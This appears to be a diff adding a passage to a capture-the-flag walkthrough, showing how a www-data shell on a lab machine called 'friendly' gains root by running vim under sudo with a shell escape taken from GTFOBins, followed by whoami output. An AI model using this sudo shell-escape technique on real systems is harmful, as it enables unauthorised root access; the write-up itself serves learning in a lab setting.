@@ -179,6 +179,29 @@ In this scenario we we be using a website called GTFOBins
 
 As you see vim is the directory to become root so inside the website we will search for exploits in vim 
 
+<img width="1092" height="473" alt="vim" src="https://github.com/user-attachments/assets/c2d45980-b8e4-4907-aad6-9e4dc9b542ec" />
+
+Then scroll to sudo and you will find the command to run in this case
+
+vim -c ':!/bin/sh' 
+
+and we complete it using the entire command
+
+sudo -u root vim -c ':!/bin/sh' hit enter and whoami to check what user we are 
+
+www-data@friendly:/$ sudo -u root vim -c ':!/bin/sh'
+
+ **whoami**
+ 
+root
+
+
+
+
+
+
+
+
 
 
 
